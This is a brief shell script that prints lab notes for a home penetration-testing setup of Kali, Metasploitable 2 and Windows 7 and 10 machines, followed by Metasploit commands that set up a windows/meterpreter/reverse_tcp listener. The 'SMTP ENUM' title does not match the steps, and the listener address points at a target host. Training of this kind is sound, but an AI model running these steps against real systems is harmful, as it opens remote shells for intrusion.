echo '
--] SMTP ENUM 34

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133




OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OSCAR
OPERATOR    ==> TASK ==> set lport 4444
OPERATOR    ==> TASK ==> exploit -j


'
read